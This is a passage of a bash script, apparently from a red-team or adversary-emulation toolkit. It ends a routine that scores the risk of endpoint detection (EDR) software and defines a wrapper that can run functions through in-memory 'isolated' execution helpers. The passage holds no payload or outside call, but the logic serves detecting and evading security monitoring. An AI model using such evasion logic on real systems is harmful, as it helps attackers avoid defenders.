        risk_level="MEDIUM"
        risk_factors="${risk_factors}PROCESS_MONITOR "
    fi
    
    printf "EDR_RISK: %s FACTORS: %s\n" "$risk_level" "${risk_factors:-NONE}"
    
    # Return risk level as exit code for programmatic use
    case "$risk_level" in
        "HIGH") return 2 ;;
        "MEDIUM") return 1 ;;
        *) return 0 ;;
    esac
}

# Purpose: Execute function with optional memory isolation
# Inputs: $1 = function name, $@ = function arguments
# Outputs: Function result, optionally through memory isolation
# - Uses memory isolation if ISOLATED=true
core_execute_function() {
    local func_name="$1"
    shift
    local func_args="$*"
    
    if [ "$ISOLATED" = "true" ]; then
        # Execute in memory isolated environment
        local buffer_name="func_$(date +%s)"
        core_debug_print "Executing $func_name in isolated mode"
        
        if memory_create_buffer "$buffer_name"; then
            # Execute function in isolated process
            memory_spawn_isolated "$buffer_name" "$func_name $func_args"
            sleep 0.5  # Brief delay for execution
            
            # Read results
            local result=$(memory_read_buffer "${buffer_name}_proc")
            
            # Cleanup
            memory_cleanup_buffer "$buffer_name"
            
            printf "%s" "$result"
            return 0
        else
            core_handle_error "Failed to create isolated execution environment"
            # Fallback to normal execution
            $func_name "$@"
            return $?
        fi
    else
        # Normal execution
        $func_name "$@"
        return $?
    fi
}

# Purpose: Check if we have any valid actions to execute

# Execute main function with all arguments
core_main "$@" 